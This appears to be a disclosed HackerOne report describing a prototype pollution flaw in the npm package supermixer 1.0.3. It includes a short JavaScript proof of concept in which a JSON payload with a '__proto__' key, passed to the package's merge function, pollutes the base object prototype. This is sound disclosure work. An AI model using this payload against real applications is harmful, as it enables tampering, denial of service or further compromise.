# [supermixer] Prototype pollution

## Report Details
- **Report ID**: 959987
- **URL**: https://hackerone.com/reports/959987
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-08-16T18:25:28.137Z
- **Disclosed**: 2020-08-20T11:10:40.365Z

## Reporter
- **Username**: u0pattern
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a Prototype pollution in supermixer, It allows an attacker to modify the prototype of a base object which can vary in severity depending on the implementation.

# Module

**module name:** supermixer
**version:** 1.0.3
**npm page:** `https://www.npmjs.com/package/supermixer`

## Module Description

Mixes/merges/extends your object in multiple ways.

Unlike underscore/lodash utility methods this module allows you to:

* mix or deep merge objects' prototype chain. Regular mixin/extend/assign implementations can't do that.
* mix or deep merge unique properties only. I.e. data will not be overwritten if a property already exists.
* filter each individual property by target value, source value, and key. See API.
*  transform each value by resulting value, source value, and key. See API.

## Module Stats

[577] weekly downloads

# Vulnerability

## Vulnerability Description

Prototype Pollution is a vulnerability affecting JavaScript, Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects.

## Steps To Reproduce:

```javascript
var mixer = require('supermixer');
var payload = '{"__proto__":{"poc":"evil"}}';
var test = {};
console.log("Before: ", test.poc);
mixer.merge({},JSON.parse(payload));
console.log("After: ", test.poc);
```

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

DoS, Access to restricted data, rce (**depends on implementation**)

## Attachments
No attachments
